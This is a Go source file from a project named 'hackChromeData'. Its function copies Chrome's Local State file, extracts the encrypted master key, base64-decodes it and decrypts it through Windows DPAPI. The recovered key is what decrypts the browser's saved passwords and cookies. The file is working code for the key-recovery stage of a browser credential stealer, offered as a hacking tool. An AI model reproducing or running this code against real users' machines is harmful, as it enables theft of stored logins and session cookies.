package masterkey

import (
	"encoding/base64"
	"fmt"
	"github.com/tidwall/gjson"
	"hackChromeData/decrypter"
	"hackChromeData/util"
	"os"
)

func GetMasterKey(filepath string) ([]byte, error) {
	keyFile := "./key"
	err := util.FileCopy(filepath, keyFile)
	if err != nil {
		return nil, fmt.Errorf("FileCopy failed: %w", err)
	}
	defer os.Remove(keyFile)
	j, err := os.ReadFile(keyFile)
	if err != nil {
		return nil, fmt.Errorf("Failed to open the copied local state file: %w", err)
	}
	encryptedKey := gjson.Get(string(j), "os_crypt.encrypted_key")
	fmt.Println(encryptedKey.Num)
	if encryptedKey.Exists() {
		pureKey, err := base64.StdEncoding.DecodeString(encryptedKey.String())
		if err != nil {
			return nil, err
		}
		masterKey, err := decrypter.DPApi(pureKey[5:])
		return masterKey, err
	}
	return nil, nil
}
